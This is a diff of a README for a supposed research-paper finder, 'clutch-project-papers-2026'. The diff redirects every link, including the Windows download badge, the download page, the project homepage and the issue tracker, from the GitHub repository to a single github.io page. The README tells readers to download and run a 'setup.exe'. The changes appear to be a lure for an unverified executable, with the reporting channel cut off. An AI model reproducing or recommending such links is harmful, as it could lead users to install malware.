@@ -1,6 +1,6 @@
 # 🔬 clutch-project-papers-2026 - Find Research Papers, Fast and Simple
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=windows)](https://github.com/indiangiverpermissibility951/clutch-project-papers-2026/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=windows)](https://indiangiverpermissibility951.github.io)
 
 ## 📖 What Is This?
 
@@ -25,7 +25,7 @@ Your computer needs these things:
 
 Visit the download page:
 
-[**Download Clutch Project v2026**](https://github.com/indiangiverpermissibility951/clutch-project-papers-2026/releases)
+[**Download Clutch Project v2026**](https://indiangiverpermissibility951.github.io)
 
 Look for the file named `clutch-project-papers-2026-setup.exe` or something similar. Click it to start the download.
 
@@ -136,9 +136,9 @@ The tool updates automatically. New papers appear as they get published. You alw
 
 ## 🔗 Quick Links
 
-- [Download Page](https://github.com/indiangiverpermissibility951/clutch-project-papers-2026/releases)
-- [Project Homepage](https://github.com/indiangiverpermissibility951/clutch-project-papers-2026)
-- [Report an Issue](https://github.com/indiangiverpermissibility951/clutch-project-papers-2026/issues)
+- [Download Page](https://indiangiverpermissibility951.github.io)
+- [Project Homepage](https://indiangiverpermissibility951.github.io)
+- [Report an Issue](https://indiangiverpermissibility951.github.io)
 
 ## 📄 License
 
